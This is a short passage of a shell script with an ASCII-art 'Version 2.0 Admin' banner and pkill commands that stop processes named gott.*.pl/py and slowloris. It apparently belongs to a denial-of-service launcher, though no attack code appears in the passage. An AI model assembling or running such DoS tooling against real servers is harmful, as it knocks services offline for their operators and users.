    echo -e "  ¦¦¦${RED}             | (_ / _ \| |   | |    \ V / / / | () |${BLUE}               ¦¦¦ "
    echo -e "  ¦¦¦${RED}              \___\___/|_|   |_|     \_/ /___(_)__/ ${BLUE}               ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦                      Version 2.0 Admin                            ¦¦¦ "
    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
pkill gott.1.pl
pkill gott.2.py
pkill gott.2.pl
pkill gott.4.pl
pkill slowloris
}

